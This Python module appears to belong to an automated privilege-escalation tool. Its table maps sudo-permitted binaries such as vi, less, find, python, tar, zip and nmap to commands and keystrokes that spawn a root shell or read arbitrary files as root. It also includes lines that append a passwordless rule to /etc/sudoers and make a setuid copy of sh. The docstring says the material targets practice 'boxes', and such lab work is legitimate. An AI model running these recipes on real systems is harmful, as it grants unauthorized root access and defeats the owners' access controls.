"""GTFOBins sudo privilege-escalation recipes.

Maps a binary allowed via `sudo -l` to how it becomes root. Two shapes:

  freeargs=True  -> the sudo rule lets you append args, so scryer can run a
                    non-interactive one-liner that reads a file (or spawns a
                    shell) as root: `auto_read` reads {f}, `shell` is the manual
                    interactive form.
  interactive    -> the binary must be driven from *inside* it (editors/pagers).
                    `inside` lists the exact keystrokes to type once it's open;
                    `inside_read` reads {f} in one step. These work even when the
                    sudo rule pins fixed arguments (the classic `sudo vi <file>`).

Only a curated, high-hit subset — the binaries that actually show up on easy/
medium boxes.
"""

from __future__ import annotations

from typing import Optional

# name -> recipe
SUDO = {
    # --- editors / pagers: exploited from inside, survive fixed-arg sudo rules
    "vi": {"interactive": True,
           "inside": [":set shell=/bin/sh", ":shell"],
           "inside_read": ":!cat {f}"},
    "vim": {"interactive": True,
            "inside": [":set shell=/bin/sh", ":shell"],
            "inside_read": ":!cat {f}"},
    "view": {"interactive": True, "inside": [":set shell=/bin/sh", ":shell"],
             "inside_read": ":!cat {f}"},
    "nano": {"interactive": True,
             "inside": ["^R^X  (Ctrl-R then Ctrl-X)", "reset; sh 1>&0 2>&0"]},
    "less": {"interactive": True, "inside": ["!/bin/sh"], "inside_read": ":e {f}"},
    "more": {"interactive": True, "inside": ["!/bin/sh"]},
    "man": {"interactive": True, "inside": ["!/bin/sh"]},
    "pico": {"interactive": True, "inside": ["^R^X", "reset; sh 1>&0 2>&0"]},
    "ed": {"interactive": True, "inside": ["!/bin/sh"]},

    # --- free-arg binaries: fully scriptable to a root shell / file read
    "find": {"freeargs": True,
             "shell": "sudo find . -maxdepth 0 -exec /bin/sh \\; -quit",
             "auto_read": "find /etc/hostname -maxdepth 0 -exec cat {f} \\;"},
    "python": {"freeargs": True,
               "shell": "sudo python -c 'import os;os.system(\"/bin/sh\")'",
               "auto_read": "python -c 'import sys;print(open(\"{f}\").read())'"},
    "python3": {"freeargs": True,
                "shell": "sudo python3 -c 'import os;os.system(\"/bin/sh\")'",
                "auto_read": "python3 -c 'import sys;print(open(\"{f}\").read())'"},
    "perl": {"freeargs": True,
             "shell": "sudo perl -e 'exec \"/bin/sh\";'",
             "auto_read": "perl -ne 'print' {f}"},
    "ruby": {"freeargs": True,
             "shell": "sudo ruby -e 'exec \"/bin/sh\"'",
             "auto_read": "ruby -e 'print File.read(\"{f}\")'"},
    "awk": {"freeargs": True,
            "shell": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
            "auto_read": "awk '{print}' {f}"},
    "gawk": {"freeargs": True, "shell": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
             "auto_read": "gawk '{print}' {f}"},
    "bash": {"freeargs": True, "shell": "sudo bash", "auto_read": "bash -c 'cat {f}'"},
    "sh": {"freeargs": True, "shell": "sudo sh", "auto_read": "sh -c 'cat {f}'"},
    "env": {"freeargs": True, "shell": "sudo env /bin/sh",
            "auto_read": "env cat {f}"},
    "node": {"freeargs": True,
             "shell": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
             "auto_read": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"{f}\",\"utf8\"))'"},
    "tee": {"freeargs": True, "shell": "# echo 'root ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",
            "auto_read": "cat {f}"},   # tee reads via redirection; use with care
    "cat": {"freeargs": True, "shell": "sudo cat {f}", "auto_read": "cat {f}"},
    "cp": {"freeargs": True,
           "shell": "# sudo cp /bin/sh /tmp/rootsh; sudo chmod +s /tmp/rootsh (varies)",
           "auto_read": None},
    "tar": {"freeargs": True,
            "shell": "sudo tar -cf /dev/null /dev/null "
                     "--checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "auto_read": None},
    "zip": {"freeargs": True,
            "shell": "TF=$(mktemp -u); sudo zip $TF /etc/hostname -T "
                     "-TT 'sh #'; rm $TF", "auto_read": None},
    "nmap": {"freeargs": True,
             "shell": "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; "
                      "sudo nmap --script=$TF", "auto_read": None},
    "git": {"freeargs": True,
            "shell": "sudo git -p help config   # then !/bin/sh", "auto_read": None},
}


def lookup(binary: str) -> Optional[dict]:
    return SUDO.get(binary.lower())
